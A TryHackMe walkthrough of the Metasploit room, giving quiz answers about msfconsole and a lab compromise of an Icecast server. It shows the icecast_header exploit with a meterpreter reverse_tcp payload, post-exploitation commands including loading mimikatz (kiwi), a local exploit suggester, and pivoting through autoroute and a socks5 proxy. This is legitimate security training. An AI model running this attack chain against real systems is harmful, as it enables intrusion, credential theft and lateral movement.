# TryHackMe [Metasploit](https://www.tryhackme.com/room/rpmetasploit)
### References
* Boedicker, C. (2021). TryHackMe Metasploit Walkthrough [YouTube Video]. In YouTube. https://youtu.be/PpG7qASDST8
* Offensive Security. (2019). `meterpreter` Basic Commands. Offensive Security. https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
* Offensive Security. (2019). `msfconsole` Commands. Offensive Security. https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
* Rapid7. (2021). Managing the Database. Rapid7. https://docs.rapid7.com/metasploit/managing-the-database/
## Initializing...
### What switch do we add to `msfconsole` to start it without showing this information?
**Answer** `-q`
### which type of database does Metasploit 5 use?
**Answer** `postgresql`
## Rock 'em to the Core
### The help menu has a very short one-character alias, what is it?
**Answer** `?`
### What is the base command we use for searching?
**Answer** `search`
### Once we've found the module we want to leverage, what command we use to select it as the active module?
**Answer** `use`
### How about if we want to view information about either a specific module or just the active one we have selected?
**Answer** `info`
### Metasploit has a built-in netcat-like function where we can make a quick connection with a host simply to verify that we can 'talk' to it. What command is this?
**Answer** `connect`
###  what command displays the motd/ascii art we see when we start msfconsole (without `-q` flag)?
**Answer** `banner`
### What command do we use to change the value of a variable?
**Answer** `set`
### What command changes the value of a variable globally?
**Answer** `setg`
### Now that we've learned how to change the value of variables, how do we view them?
**Answer** `get`
### How about changing the value of a variable to `null`/no value?
**Answer** `unset`
### What command can we use to set our console output to save to a file?
**Answer** `spool`
### What command can we use to store the settings/active datastores from Metasploit to a settings file?
**Answer** `save`
## Modules for Every Occasion!
### Easily the most common module utilized, which module holds all of the exploit code we will use?
**Answer** `exploit`
### which module contains the various bits of shellcode we send to have executed following exploitation?
**Answer** `payload`
### Which module is most commonly used in scanning and verification machines are exploitable?
**Answer** `auxiliary`
###  Which module contains the various bits of shellcode we send to have executed following exploitation?
### One of the most common activities after exploitation is looting and pivoting. Which module provides these capabilities?
**Answer** `post`
### Which module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection?
**Answer** `encoder`
### Which module is used with buffer overflow and ROP attacks?
**Answer** `nop`
### What command can we use to load different modules? 
**Answer** `load`
## Move that shell!
### What service does nmap identify running on port **135**?
```
msf6 > db_nmap -sV 10.10.196.190
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-20 17:09 AEST
[*] Nmap: Nmap scan report for 10.10.196.190
[*] Nmap: Host is up (0.28s latency).
[*] Nmap: Not shown: 988 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: 8000/tcp  open  http               Icecast streaming media server
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49160/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 159.21 seconds
msf6 > services 
Services
========

host           port   proto  name               state  info
----           ----   -----  ----               -----  ----
10.10.196.190  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.196.190  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.196.190  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.196.190  3389   tcp    ssl/ms-wbt-server  open
10.10.196.190  5357   tcp    http               open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.10.196.190  8000   tcp    http               open   Icecast streaming media server
10.10.196.190  49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.196.190  49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.196.190  49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.196.190  49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.196.190  49159  tcp    msrpc              open   Microsoft Windows RPC
10.10.196.190  49160  tcp    msrpc              open   Microsoft Windows RPC
```

**Answer**: `msrpc`
### What is the full path for our exploit that now appears on the `msfconsole` prompt?
```
msf6 > use icecast
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

[*] Using exploit/windows/http/icecast_header
```

**Answer**: `exploit/windows/http/icecast_header`
### What is the name of the column on the far left side of the console that shows up next to `Name`?
```
msf6 > search multi/handler

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5  exploit/multi/handler                                                 manual     No     Generic Payload Handler
   6  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   8  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence


Interact with a module by name or index. For example info 8, use 8 or use exploit/linux/local/yum_package_manager_persistence
```

**Answer**: `#`
## We're in, now what?
### What's the name of the spool service?
```
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/icecast_header) > use exploit/windows/http/icecast_header
msf6 exploit(windows/http/icecast_header) > set LHOST tun0
msf6 exploit(windows/http/icecast_header) > set RHOSTS <MACHINE_IP>
meterpreter > ps

Process List
============

 PID   PPID  Name                    Arch  Session  User          Path
 ---   ----  ----                    ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 416   4     smss.exe
 544   536   csrss.exe
 560   816   WmiPrvSE.exe
 584   692   svchost.exe
 592   536   wininit.exe
 604   584   csrss.exe
 652   584   winlogon.exe
 692   592   services.exe
 700   592   lsass.exe
 708   592   lsm.exe
 816   692   svchost.exe
 884   692   svchost.exe
 932   692   svchost.exe
 1020  692   svchost.exe
 1056  692   svchost.exe
 1136  692   svchost.exe
 1292  692   mscorsvw.exe
 1308  1020  dwm.exe                 x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1320  1296  explorer.exe            x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1360  692   spoolsv.exe
 1388  692   svchost.exe
 1428  692   taskhost.exe            x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1548  692   amazon-ssm-agent.exe
 1636  692   LiteAgent.exe
 1672  692   svchost.exe
 1768  692   sppsvc.exe
 1816  692   Ec2Config.exe
 2080  692   svchost.exe
 2240  692   TrustedInstaller.exe
 2268  1320  Icecast2.exe            x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2280  584   WMIADAP.exe
 2308  692   vds.exe
 2404  816   WmiPrvSE.exe
 2616  692   SearchIndexer.exe
 2812  816   rundll32.exe            x64   1        Dark-PC\Dark  C:\Windows\System32\rundll32.exe
 2860  2812  dinotify.exe            x64   1        Dark-PC\Dark  C:\Windows\System32\dinotify.exe
 2956  2616  SearchProtocolHost.exe  x64   1        Dark-PC\Dark  C:\Windows\System32\SearchProtocolHost.exe
 3068  692   mscorsvw.exe
```
**Answer**: `spoolsv.exe`
### What command do we use to transfer ourselves into the process?
**Answer**: `migrate`
### What command can we run to find out more information regarding the current user running the process we are in?
```
meterpreter > getuid 
Server username: Dark-PC\Dark
```
**Answer**: `getuid`
### How about finding more information out about the system itself?
```
meterpreter > sysinfo 
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```
**Answer**: `sysinfo`
### This might take a little bit of googling, what do we run to load `mimikatz` (more specifically the new version of `mimikatz`) so we can use it? 
**Answer**: `load kiwi`
### Let's go ahead and figure out the privileges of our current user, what command do we run?
```
meterpreter > getprivs 

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```
**Answer**: `getprivs`
### What command do we run to transfer files to our victim computer?
**Answer**: `upload`
### How about if we want to run a Metasploit module?
**Answer**: `run`
### A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim?
**Answer**: `ipconfig`
### What command can we run in our meterpreter session to spawn a normal system shell?
**Answer**: `shell`
```
meterpreter > run post/windows/gather/checkvm

[*] Checking if DARK-PC is a Virtual Machine ...
[+] This is a Xen Virtual Machine
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.89.122 - Collecting local exploits for x86/windows...
[*] 10.10.89.122 - 37 exploit checks are being tried...
[+] 10.10.89.122 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.89.122 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.89.122 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.89.122 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.89.122 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.89.122 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.89.122 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.89.122 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.89.122 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
meterpreter > run post/windows/manage/enable_rdp

[-] Insufficient privileges, Remote Desktop Service was not modified
meterpreter > 
```
##  Makin' Cisco Proud
### What command do we run to add a route to the following subnet: `172.18.1.0/24`?
```
meterpreter > run autoroute -h

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Usage:   run autoroute [-r] -s subnet -n netmask
[*] Examples:
[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
[*]   run autoroute -p                            # Print active routing table
[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module
meterpreter > run autoroute -s 172.18.1.0 -n 255.255.255.0

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.18.1.0/255.255.255.0...
[+] Added route to 172.18.1.0/255.255.255.0 via 10.10.89.122
[*] Use the -p option to list all active routes
```
**Answer**: `run autoroute -s 172.18.1.0 -n 255.255.255.0`
### What is the full path to the socks5 auxiliary module?
**Answer**: `auxiliary/server/socks5`
### What command do we prefix our commands (outside of Metasploit) to run them through our socks5 server with `proxychains`?
**Answer**: `proxychains`